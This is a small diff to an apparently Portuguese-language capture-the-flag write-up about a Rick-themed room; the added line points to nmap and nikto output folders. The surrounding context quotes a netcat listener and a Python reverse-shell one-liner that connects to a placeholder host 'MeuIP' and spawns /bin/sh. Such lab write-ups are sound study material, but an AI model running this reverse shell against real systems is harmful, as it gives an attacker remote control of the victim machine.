@@ -42,6 +42,8 @@ O objetivo do CTF era encontrar três "ingredientes" para ajudar Rick a se trans
 * `nc -lnvp 9999`
 * ```python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("MeuIP",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'```
 
+* **OBS:** As saídas do nmap e do nikto estão localizadas em suas respectivas pastas neste repositório.
+
 ### Detalhamento dos comandos utilizados:
 
 **Detalhamento do comando usado no Nmap:**
